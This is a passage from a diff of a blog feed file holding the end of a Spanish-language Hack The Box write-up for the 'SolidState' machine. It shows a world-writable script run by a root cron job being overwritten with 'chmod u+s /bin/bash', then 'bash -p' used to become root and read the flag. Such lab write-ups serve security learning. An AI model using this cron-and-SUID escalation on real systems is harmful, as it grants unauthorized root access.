-${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./procmon.sh 
-&amp;gt; root     /usr/sbin/CRON -f
-&amp;gt; root     /bin/sh -c python /opt/tmp.py
-&amp;gt; root     python /opt/tmp.py
-&amp;lt; root     /usr/sbin/CRON -f
-&amp;lt; root     /bin/sh -c python /opt/tmp.py
-&amp;lt; root     python /opt/tmp.py
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si inspeccionamos los permisos del archivo, podemos ver que tenemos capacidad de escritura, quiere decir que podemos modificarlo y al cabo de unos minutos el usuario &lt;code&gt;root&lt;/code&gt; sera el que lo ejecute.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp.py 
--rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a modificarlo para que al ejecutar otorgue el permiso &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
-#!/usr/bin/env python
-import os
-os.system(&quot;chmod u+s /bin/bash&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esperamos unos minutos y vemos que ahora la bash ya cuenta con el permisos &lt;code&gt;suid&lt;/code&gt;, ahora podemos convertirnos en el usuario &lt;code&gt;root&lt;/code&gt; , ir a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
--rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
-${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
-bash-4.4# whoami
-root
-bash-4.4# cd /root/
-bash-4.4# cat root.txt 
-1a0cd964c524d89ebe2a7d630f938518
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-SolidState</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-SolidState</guid>
-        
-        <category>Information Leaked</category>
-        
-        <category>Escaping Restricted Bash</category>
-        
-        <category>Abusing Cron Jobs</category>
         
         
         <category>hackthebox</category>
